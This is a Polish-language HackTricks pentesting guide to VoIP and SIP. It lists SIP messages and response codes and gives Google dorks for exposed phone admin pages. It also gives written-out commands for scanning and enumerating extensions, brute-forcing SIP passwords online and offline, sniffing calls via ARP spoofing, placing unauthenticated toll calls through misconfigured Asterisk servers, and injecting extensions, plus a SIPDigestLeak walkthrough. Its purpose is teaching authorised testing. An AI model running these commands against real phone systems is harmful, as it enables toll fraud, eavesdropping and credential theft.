# Pentesting VoIP

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siƒô trikami hackingowymi, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori√≥w na githubie.

</details>
{% endhint %}

## VoIP Podstawowe Informacje

Aby zaczƒÖƒá uczyƒá siƒô, jak dzia≈Ça VoIP, sprawd≈∫:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Podstawowe Wiadomo≈õci
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Kody Odpowiedzi

**1xx‚ÄîOdpowiedzi Provisional**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx‚ÄîOdpowiedzi z sukcesem**
```
200 OK
202 Accepted
204 No Notification
```
**3xx‚ÄîOdpowiedzi PrzekierowujƒÖce**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx‚ÄîOdpowiedzi o b≈Çƒôdach klienta**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx‚ÄîOdpowiedzi o b≈Çƒôdach serwera**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx‚ÄîGlobal Failure Responses**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Numery Telefon√≥w

Jednym z pierwszych krok√≥w, kt√≥re mo≈ºe podjƒÖƒá Red Team, jest wyszukiwanie dostƒôpnych numer√≥w telefon√≥w do kontaktu z firmƒÖ za pomocƒÖ narzƒôdzi OSINT, wyszukiwania w Google lub skanowania stron internetowych.

Gdy ju≈º masz numery telefon√≥w, mo≈ºesz skorzystaƒá z us≈Çug online, aby zidentyfikowaƒá operatora:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

ZnajƒÖc operatora, kt√≥ry ≈õwiadczy us≈Çugi VoIP, mo≈ºesz zidentyfikowaƒá, czy firma korzysta z VoIP... Co wiƒôcej, mo≈ºliwe jest, ≈ºe firma nie zatrudni≈Ça us≈Çug VoIP, ale u≈ºywa kart PSTN do pod≈ÇƒÖczenia w≈Çasnej centrali VoIP do tradycyjnej sieci telefonicznej.

Rzeczy takie jak automatyczne odpowiedzi z muzykƒÖ zazwyczaj wskazujƒÖ, ≈ºe u≈ºywane jest VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT information

Ka≈ºda inna enumeracja OSINT, kt√≥ra pomo≈ºe zidentyfikowaƒá u≈ºywane oprogramowanie VoIP, bƒôdzie pomocna dla Red Team.

### Network Enumeration

* **`nmap`** jest w stanie skanowaƒá us≈Çugi UDP, ale z powodu liczby skanowanych us≈Çug UDP, jest bardzo wolny i mo≈ºe nie byƒá zbyt dok≈Çadny w przypadku tego rodzaju us≈Çug.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** z SIPVicious (`sudo apt install sipvicious`): Zlokalizuje us≈Çugi SIP w wskazanej sieci.
* `svmap` jest **≈Çatwy do zablokowania**, poniewa≈º u≈ºywa User-Agent `friendly-scanner`, ale mo≈ºesz zmodyfikowaƒá kod z `/usr/share/sipvicious/sipvicious` i go zmieniƒá.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** Skanowanie SIPPTS to bardzo szybki skaner dla us≈Çug SIP przez UDP, TCP lub TLS. U≈ºywa wielowƒÖtkowo≈õci i mo≈ºe skanowaƒá du≈ºe zakresy sieci. Umo≈ºliwia ≈Çatwe wskazanie zakresu port√≥w, skanowanie zar√≥wno TCP, jak i UDP, u≈ºycie innej metody (domy≈õlnie u≈ºyje OPTIONS) oraz okre≈õlenie innego User-Agent (i wiƒôcej).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Dodatkowe enumerowanie sieci

PBX mo≈ºe r√≥wnie≈º udostƒôpniaƒá inne us≈Çugi sieciowe, takie jak:

* **69/UDP (TFTP)**: Aktualizacje oprogramowania
* **80 (HTTP) / 443 (HTTPS)**: ZarzƒÖdzanie urzƒÖdzeniem z poziomu sieci
* **389 (LDAP)**: Alternatywa do przechowywania informacji o u≈ºytkownikach
* **3306 (MySQL)**: Baza danych MySQL
* **5038 (Manager)**: Umo≈ºliwia korzystanie z Asteriska z innych platform
* **5222 (XMPP)**: Wiadomo≈õci za pomocƒÖ Jabber
* I inne...

### Enumerowanie metod

Mo≈ºliwe jest znalezienie **kt√≥re metody sƒÖ dostƒôpne** do u≈ºycia w PBX za pomocƒÖ `SIPPTS enumerate` z [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Analizowanie odpowiedzi serwera

Bardzo wa≈ºne jest, aby analizowaƒá nag≈Ç√≥wki, kt√≥re serwer wysy≈Ça z powrotem do nas, w zale≈ºno≈õci od rodzaju wiadomo≈õci i nag≈Ç√≥wk√≥w, kt√≥re wysy≈Çamy. Za pomocƒÖ `SIPPTS send` z [**sippts**](https://github.com/Pepelux/sippts) mo≈ºemy wysy≈Çaƒá spersonalizowane wiadomo≈õci, manipulujƒÖc wszystkimi nag≈Ç√≥wkami, i analizowaƒá odpowied≈∫.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Mo≈ºliwe jest r√≥wnie≈º uzyskanie danych, je≈õli serwer u≈ºywa websockets. Za pomocƒÖ `SIPPTS wssend` z [**sippts**](https://github.com/Pepelux/sippts) mo≈ºemy wysy≈Çaƒá spersonalizowane wiadomo≈õci WS.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Extension Enumeration

Rozszerzenia w systemie PBX (Prywatna Centrala Telefoniczna) odnoszƒÖ siƒô do **unikalnych identyfikator√≥w wewnƒôtrznych przypisanych do poszczeg√≥lnych** linii telefonicznych, urzƒÖdze≈Ñ lub u≈ºytkownik√≥w w organizacji lub firmie. Rozszerzenia umo≈ºliwiajƒÖ **efektywne kierowanie po≈ÇƒÖczeniami wewnƒÖtrz organizacji**, bez potrzeby posiadania indywidualnych zewnƒôtrznych numer√≥w telefon√≥w dla ka≈ºdego u≈ºytkownika lub urzƒÖdzenia.

* **`svwar`** z SIPVicious (`sudo apt install sipvicious`): `svwar` to darmowy skaner linii rozszerze≈Ñ SIP PBX. W koncepcji dzia≈Ça podobnie do tradycyjnych wardialer√≥w, **zgadujƒÖc zakres rozszerze≈Ñ lub podanƒÖ listƒô rozszerze≈Ñ**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identyfikuje rozszerzenia na serwerze SIP. Sipexten mo≈ºe sprawdzaƒá du≈ºe zakresy sieci i port√≥w.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Mo≈ºesz r√≥wnie≈º enumerowaƒá rozszerzenia/nazwy u≈ºytkownik√≥w za pomocƒÖ metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** to **enumerator brute-force nazw u≈ºytkownik√≥w** protoko≈Çu Inter Asterisk Exchange. enumIAX mo≈ºe dzia≈Çaƒá w dw√≥ch odrƒôbnych trybach: sekwencyjnego zgadywania nazw u≈ºytkownik√≥w lub ataku s≈Çownikowego.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataki VoIP

### Atak Brute-Force na has≈Ço - online

Po odkryciu **PBX** i niekt√≥rych **rozszerze≈Ñ/nazw u≈ºytkownik√≥w**, Zesp√≥≈Ç Czerwony mo≈ºe spr√≥bowaƒá **uwierzytelniƒá siƒô za pomocƒÖ metody `REGISTER`** do rozszerzenia, u≈ºywajƒÖc s≈Çownika powszechnych hase≈Ç do przeprowadzenia ataku brute force na uwierzytelnienie.

{% hint style="danger" %}
Zauwa≈º, ≈ºe **nazwa u≈ºytkownika** mo≈ºe byƒá taka sama jak rozszerzenie, ale ta praktyka mo≈ºe siƒô r√≥≈ºniƒá w zale≈ºno≈õci od systemu PBX, jego konfiguracji i preferencji organizacji...

Je≈õli nazwa u≈ºytkownika nie jest taka sama jak rozszerzenie, bƒôdziesz musia≈Ç **ustaliƒá nazwƒô u≈ºytkownika, aby przeprowadziƒá atak brute-force**.
{% endhint %}

* **`svcrack`** z SIPVicious (`sudo apt install sipvicious`): SVCrack pozwala na z≈Çamanie has≈Ça dla konkretnej nazwy u≈ºytkownika/rozszerzenia na PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack to zdalny program do ≈Çamania hase≈Ç dla us≈Çug SIP. Rcrack mo≈ºe testowaƒá has≈Ça dla kilku u≈ºytkownik√≥w w r√≥≈ºnych adresach IP i zakresach port√≥w.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP Sniffing

Je≈õli znajdziesz sprzƒôt VoIP w **otwartej sieci Wifi**, mo≈ºesz **przechwyciƒá wszystkie informacje**. Co wiƒôcej, je≈õli jeste≈õ w bardziej zamkniƒôtej sieci (po≈ÇƒÖczonej przez Ethernet lub chronionƒÖ Wifi), mo≈ºesz przeprowadziƒá **ataki MitM, takie jak** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) miƒôdzy **PBX a bramƒÖ**, aby przechwyciƒá informacje.

W≈õr√≥d informacji sieciowych mo≈ºesz znale≈∫ƒá **dane logowania do zarzƒÖdzania sprzƒôtem**, **numery wewnƒôtrzne** u≈ºytkownik√≥w, **nazwy u≈ºytkownik√≥w**, **adresy IP**, a nawet **zhardcodowane has≈Ça** i **pakiety RTP**, kt√≥re mo≈ºesz odtworzyƒá, aby **us≈Çyszeƒá rozmowƒô**, i wiƒôcej.

Aby uzyskaƒá te informacje, mo≈ºesz u≈ºyƒá narzƒôdzi takich jak Wireshark, tcpdump... ale **specjalnie stworzone narzƒôdzie do przechwytywania rozm√≥w VoIP to** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Zauwa≈º, ≈ºe je≈õli **TLS jest u≈ºywany w komunikacji SIP**, nie bƒôdziesz w stanie zobaczyƒá komunikacji SIP w czystym tek≈õcie.\
To samo stanie siƒô, je≈õli u≈ºywane sƒÖ **SRTP** i **ZRTP**, **pakiety RTP nie bƒôdƒÖ w czystym tek≈õcie**.
{% endhint %}

#### SIP credentials (Password Brute-Force - offline)

[Sprawd≈∫ ten przyk≈Çad, aby lepiej zrozumieƒá **komunikacjƒô SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example), aby dowiedzieƒá siƒô, jak **sƒÖ wysy≈Çane dane logowania**.

* **`sipdump`** i **`sipcrack`,** czƒô≈õƒá **sipcrack** (`apt-get install sipcrack`): Te narzƒôdzia mogƒÖ **wyodrƒôbniƒá** z **pcap** **uwierzytelnienia digest** w protokole SIP i **przeprowadziƒá atak brute-force**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump mo≈ºe wyodrƒôbniƒá uwierzytelnienia digest z pliku pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack to narzƒôdzie do ≈Çamania uwierzytelnie≈Ñ digestowych uzyskanych za pomocƒÖ zrzutu SIPPTS.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark wyodrƒôbnia dane protoko≈Çu SIP z pliku PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### Kody DTMF

**Nie tylko dane uwierzytelniajƒÖce SIP** mo≈ºna znale≈∫ƒá w ruchu sieciowym, mo≈ºliwe jest r√≥wnie≈º znalezienie kod√≥w DTMF, kt√≥re sƒÖ u≈ºywane na przyk≈Çad do uzyskania dostƒôpu do **poczty g≈Çosowej**.\
Mo≈ºna wysy≈Çaƒá te kody w **wiadomo≈õciach INFO SIP**, w **audio** lub wewnƒÖtrz **pakiet√≥w RTP**. Je≈õli kody znajdujƒÖ siƒô w pakietach RTP, mo≈ºna wyciƒÖƒá tƒô czƒô≈õƒá rozmowy i u≈ºyƒá narzƒôdzia multimo do ich ekstrakcji:
```bash
multimon -a DTMF -t wac pin.wav
```
### Free Calls / Asterisks Connections Misconfigurations

W Asterisku mo≈ºliwe jest zezwolenie na po≈ÇƒÖczenie **z konkretnego adresu IP** lub z **dowolnego adresu IP**:
```
host=10.10.10.10
host=dynamic
```
Je≈õli adres IP jest okre≈õlony, host **nie bƒôdzie musia≈Ç wysy≈Çaƒá ≈ºƒÖda≈Ñ REGISTER** co jaki≈õ czas (w pakiecie REGISTER wysy≈Çany jest czas ≈ºycia, zazwyczaj 30 minut, co oznacza, ≈ºe w innym scenariuszu telefon bƒôdzie musia≈Ç REJESTROWAƒÜ siƒô co 30 minut). Jednak≈ºe, bƒôdzie musia≈Ç mieƒá otwarte porty umo≈ºliwiajƒÖce po≈ÇƒÖczenia z serwerem VoIP w celu odbierania po≈ÇƒÖcze≈Ñ.

Aby zdefiniowaƒá u≈ºytkownik√≥w, mo≈ºna ich zdefiniowaƒá jako:

* **`type=user`**: U≈ºytkownik mo≈ºe odbieraƒá po≈ÇƒÖczenia tylko jako u≈ºytkownik.
* **`type=friend`**: Mo≈ºliwe jest wykonywanie po≈ÇƒÖcze≈Ñ jako peer i odbieranie ich jako u≈ºytkownik (u≈ºywane z rozszerzeniami)
* **`type=peer`**: Mo≈ºliwe jest wysy≈Çanie i odbieranie po≈ÇƒÖcze≈Ñ jako peer (SIP-trunki)

Mo≈ºliwe jest r√≥wnie≈º nawiƒÖzanie zaufania za pomocƒÖ zmiennej insecure:

* **`insecure=port`**: Umo≈ºliwia po≈ÇƒÖczenia peer weryfikowane przez IP.
* **`insecure=invite`**: Nie wymaga uwierzytelnienia dla wiadomo≈õci INVITE
* **`insecure=port,invite`**: Oba

{% hint style="warning" %}
Gdy u≈ºywane jest **`type=friend`**, **warto≈õƒá** zmiennej **host** **nie bƒôdzie u≈ºywana**, wiƒôc je≈õli administrator **b≈Çƒôdnie skonfiguruje SIP-trunk** u≈ºywajƒÖc tej warto≈õci, **ka≈ºdy bƒôdzie m√≥g≈Ç siƒô z nim po≈ÇƒÖczyƒá**.

Na przyk≈Çad, ta konfiguracja by≈Çaby podatna na atak:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Darmowe Po≈ÇƒÖczenia / B≈Çƒôdne Konfiguracje Kontekst√≥w Asteriska

W Asterisku **kontekst** to nazwany kontener lub sekcja w planie numeracyjnym, kt√≥ra **grupuje powiƒÖzane rozszerzenia, akcje i zasady**. Plan numeracyjny jest kluczowym komponentem systemu Asterisk, poniewa≈º definiuje **jak obs≈Çugiwane i kierowane sƒÖ po≈ÇƒÖczenia przychodzƒÖce i wychodzƒÖce**. Konteksty sƒÖ u≈ºywane do organizacji planu numeracyjnego, zarzƒÖdzania kontrolƒÖ dostƒôpu i zapewnienia separacji miƒôdzy r√≥≈ºnymi czƒô≈õciami systemu.

Ka≈ºdy kontekst jest definiowany w pliku konfiguracyjnym, zazwyczaj w pliku **`extensions.conf`**. Konteksty sƒÖ oznaczane nawiasami kwadratowymi, a nazwa kontekstu jest umieszczona w ich wnƒôtrzu. Na przyk≈Çad:
```bash
csharpCopy code[my_context]
```
W kontek≈õcie definiujesz numery wewnƒôtrzne (wzorce wybieranych numer√≥w) i ≈ÇƒÖczysz je z seriƒÖ dzia≈Ça≈Ñ lub aplikacji. Te dzia≈Çania okre≈õlajƒÖ, jak po≈ÇƒÖczenie jest przetwarzane. Na przyk≈Çad:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Ten przyk≈Çad demonstruje prosty kontekst o nazwie "my\_context" z rozszerzeniem "100". Gdy kto≈õ wybierze 100, po≈ÇƒÖczenie zostanie odebrane, zostanie odtworzona wiadomo≈õƒá powitalna, a nastƒôpnie po≈ÇƒÖczenie zostanie zako≈Ñczone.

To jest **inny kontekst**, kt√≥ry pozwala na **wywo≈Çanie dowolnego innego numeru**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Je≈õli administrator zdefiniuje **domy≈õlny kontekst** jako:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Ka≈ºdy bƒôdzie m√≥g≈Ç u≈ºyƒá **serwera do dzwonienia na dowolny inny numer** (a administrator serwera zap≈Çaci za po≈ÇƒÖczenie).
{% endhint %}

{% hint style="danger" %}
Co wiƒôcej, domy≈õlnie plik **`sip.conf`** zawiera **`allowguest=true`**, wiƒôc **ka≈ºdy** atakujƒÖcy bez **autoryzacji** bƒôdzie m√≥g≈Ç dzwoniƒá na dowolny inny numer.
{% endhint %}

*   **`SIPPTS invite`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite sprawdza, czy **serwer PBX pozwala nam na wykonywanie po≈ÇƒÖcze≈Ñ bez autoryzacji**. Je≈õli serwer SIP ma nieprawid≈ÇowƒÖ konfiguracjƒô, pozwoli nam na wykonywanie po≈ÇƒÖcze≈Ñ do numer√≥w zewnƒôtrznych. Mo≈ºe r√≥wnie≈º pozwoliƒá nam na przekazanie po≈ÇƒÖczenia do drugiego numeru zewnƒôtrznego.

Na przyk≈Çad, je≈õli tw√≥j serwer Asterisk ma z≈ÇƒÖ konfiguracjƒô kontekstu, mo≈ºesz zaakceptowaƒá ≈ºƒÖdanie INVITE bez autoryzacji. W takim przypadku atakujƒÖcy mo≈ºe wykonywaƒá po≈ÇƒÖczenia, nie znajƒÖc ≈ºadnego u≈ºytkownika/has≈Ça.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Darmowe po≈ÇƒÖczenia / ≈πle skonfigurowane IVRS

IVRS oznacza **System Interaktywnej Odpowiedzi G≈Çosowej**, technologiƒô telekomunikacyjnƒÖ, kt√≥ra pozwala u≈ºytkownikom na interakcjƒô z systemem komputerowym za pomocƒÖ g≈Çosu lub ton√≥w dotykowych. IVRS jest u≈ºywane do budowy **system√≥w automatycznego obs≈Çugi po≈ÇƒÖcze≈Ñ**, kt√≥re oferujƒÖ szereg funkcji, takich jak dostarczanie informacji, kierowanie po≈ÇƒÖcze≈Ñ i zbieranie danych od u≈ºytkownik√≥w.

IVRS w systemach VoIP zazwyczaj sk≈Çada siƒô z:

1. **Komunikaty g≈Çosowe**: Wstƒôpnie nagrane wiadomo≈õci audio, kt√≥re prowadzƒÖ u≈ºytkownik√≥w przez opcje menu IVR i instrukcje.
2. **DTMF** (Dual-Tone Multi-Frequency) sygnalizacja: Tones dotykowe generowane przez naci≈õniƒôcie klawiszy na telefonie, kt√≥re sƒÖ u≈ºywane do nawigacji po menu IVR i dostarczania danych.
3. **Kierowanie po≈ÇƒÖcze≈Ñ**: Kierowanie po≈ÇƒÖcze≈Ñ do odpowiedniego celu, takiego jak konkretne dzia≈Çy, agenci lub numery wewnƒôtrzne na podstawie danych od u≈ºytkownika.
4. **Zbieranie danych od u≈ºytkownik√≥w**: Zbieranie informacji od dzwoniƒÖcych, takich jak numery kont, identyfikatory spraw, lub inne istotne dane.
5. **Integracja z systemami zewnƒôtrznymi**: ≈ÅƒÖczenie systemu IVR z bazami danych lub innymi systemami oprogramowania w celu uzyskania lub aktualizacji informacji, wykonywania dzia≈Ça≈Ñ lub wyzwalania zdarze≈Ñ.

W systemie VoIP Asterisk mo≈ºesz stworzyƒá IVR u≈ºywajƒÖc planu wybierania (**`extensions.conf`** plik) oraz r√≥≈ºnych aplikacji, takich jak `Background()`, `Playback()`, `Read()`, i innych. Te aplikacje pomagajƒÖ odtwarzaƒá komunikaty g≈Çosowe, zbieraƒá dane od u≈ºytkownik√≥w i kontrolowaƒá przep≈Çyw po≈ÇƒÖcze≈Ñ.

#### Przyk≈Çad podatnej konfiguracji
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Poprzedni przyk≈Çad to sytuacja, w kt√≥rej u≈ºytkownik jest proszony o **naci≈õniƒôcie 1, aby zadzwoniƒá** do dzia≈Çu, **2, aby zadzwoniƒá** do innego, lub **pe≈Çnego numeru wewnƒôtrznego**, je≈õli go zna.\
Wra≈ºliwo≈õƒá polega na tym, ≈ºe wskazana **d≈Çugo≈õƒá numeru wewnƒôtrznego nie jest sprawdzana, wiƒôc u≈ºytkownik mo≈ºe wprowadziƒá 5-sekundowy limit jako pe≈Çny numer i zostanie on wywo≈Çany.**

### Wstrzykiwanie numeru wewnƒôtrznego

U≈ºywajƒÖc numeru wewnƒôtrznego takiego jak:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Gdzie **`${EXTEN}`** to **numer wewnƒôtrzny**, kt√≥ry bƒôdzie wywo≈Çywany, gdy **wprowadzony zostanie ext 101**, to co siƒô wydarzy:
```scss
exten => 101,1,Dial(SIP/101)
```
Jednak≈ºe, je≈õli **`${EXTEN}`** pozwala na wprowadzenie **wiƒôcej ni≈º cyfr** (jak w starszych wersjach Asteriska), atakujƒÖcy m√≥g≈Çby wprowadziƒá **`101&SIP123123123`**, aby zadzwoniƒá pod numer telefonu 123123123. I to by≈Çby wynik:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Zatem po≈ÇƒÖczenie do rozszerzenia **`101`** i **`123123123`** zostanie wys≈Çane, a tylko pierwsze z nich nawiƒÖ≈ºe po≈ÇƒÖczenie... ale je≈õli atakujƒÖcy u≈ºyje **rozszerzenia, kt√≥re omija jakiekolwiek dopasowanie**, kt√≥re jest wykonywane, ale nie istnieje, m√≥g≈Çby **wstrzyknƒÖƒá po≈ÇƒÖczenie tylko do po≈ºƒÖdanego numeru**.

## Wra≈ºliwo≈õƒá SIPDigestLeak

Wra≈ºliwo≈õƒá SIP Digest Leak dotyczy du≈ºej liczby telefon√≥w SIP, w tym zar√≥wno sprzƒôtowych, jak i programowych telefon√≥w IP oraz adapter√≥w telefonicznych (VoIP na analogowe). Wra≈ºliwo≈õƒá ta pozwala na **wyciek odpowiedzi na uwierzytelnienie Digest**, kt√≥ra jest obliczana na podstawie has≈Ça. Mo≈ºliwy jest **atak offline na has≈Ço**, kt√≥ry mo≈ºe odzyskaƒá wiƒôkszo≈õƒá hase≈Ç na podstawie odpowiedzi na wyzwanie.

**[Scenariusz wra≈ºliwo≈õci stƒÖd**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Telefon IP (ofiara) nas≈Çuchuje na dowolnym porcie (na przyk≈Çad: 5060), akceptujƒÖc po≈ÇƒÖczenia telefoniczne
2. AtakujƒÖcy wysy≈Ça INVITE do telefonu IP
3. Telefon ofiary zaczyna dzwoniƒá, a kto≈õ odbiera i odk≈Çada s≈Çuchawkƒô (poniewa≈º nikt nie odpowiada na telefon po drugiej stronie)
4. Gdy telefon zostaje od≈Ço≈ºony, **telefon ofiary wysy≈Ça BYE do atakujƒÖcego**
5. **AtakujƒÖcy wydaje odpowied≈∫ 407**, kt√≥ra **prosi o uwierzytelnienie** i wydaje wyzwanie uwierzytelniajƒÖce
6. **Telefon ofiary dostarcza odpowied≈∫ na wyzwanie uwierzytelniajƒÖce** w drugim BYE
7. **AtakujƒÖcy mo≈ºe nastƒôpnie przeprowadziƒá atak brute-force** na odpowiedzi na wyzwanie na swoim lokalnym komputerze (lub w rozproszonej sieci itp.) i odgadnƒÖƒá has≈Ço

